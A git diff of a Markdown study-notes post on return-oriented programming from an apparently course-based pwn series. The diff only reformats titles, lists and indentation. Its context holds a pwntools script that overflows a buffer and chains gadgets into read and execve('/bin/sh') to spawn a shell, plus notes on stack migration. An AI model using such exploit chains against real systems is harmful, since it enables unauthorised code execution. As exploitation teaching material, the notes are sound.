@@ -1,12 +1,12 @@
 ---
-title: NTU STCS 2016学习笔记 0x02 ROP
+title: NTU STCS 2016 0x02 ROP
 date: 2020-08-25 16:46:26
 cover: cover.jpg
 description: week4 shellcode rop
 tags:
 - pwn
 categories:
-- NTU STCS 2016学习笔记
+- NTU STCS 2016
 
 ---
 
@@ -44,8 +44,8 @@ end
 
 ## rop2syscall
 
--   找gadget控制syscall需要的regs(eax,ebx,ecx,edx)
--   需要int 80
+- 找gadget控制syscall需要的regs(eax,ebx,ecx,edx)
+- 需要int 80
 
 **RopGadget**
 
@@ -86,34 +86,33 @@ raw_input('@')
 offset = 62
 # read(0, '/bin/sh\x00', 100)
 rop1 = [
-	pop_eax_ret,
-	3,
-	pop_ebx_ret,
-	0,
-	pop_ecx_ret,
-	buf,
-	pop_edx_ret,
-	100,
-	int_0x80_ret,
+ pop_eax_ret,
+ 3,
+ pop_ebx_ret,
+ 0,
+ pop_ecx_ret,
+ buf,
+ pop_edx_ret,
+ 100,
+ int_0x80_ret,
 ]
 # execve('/bin/sh\x00', 0, 0)
 rop2 = [
-	pop_eax_ret,
-	0xb,
-	pop_ebx_ret,
-	buf,
-	pop_ecx_ret,
-	0,
-	pop_edx_ret,
-	0,
-	int_0x80_ret
+ pop_eax_ret,
+ 0xb,
+ pop_ebx_ret,
+ buf,
+ pop_ecx_ret,
+ 0,
+ pop_edx_ret,
+ 0,
+ int_0x80_ret
 ]
 payload = 'A' * offset + ''.join(map(p32, rop1)) + ''.join(map(p32, rop2))
 p.sendline(payload)
 p.sendline('/bin/sh\x00')
 p.interactive()
 ```
-
 
 ### 使用较长的gadget
 
@@ -129,10 +128,10 @@ pop   ebp
 
 **Trick: Stack Migration**
 
--   使用leave把栈放到已知位置
--   确定rop chain的位置时可以直接附加其他data
--   可以无限rop
--   migrate后的空间要足够
+- 使用leave把栈放到已知位置
+- 确定rop chain的位置时可以直接附加其他data
+- 可以无限rop
+- migrate后的空间要足够
 
 ```python
 gadget1 = 0x8048898
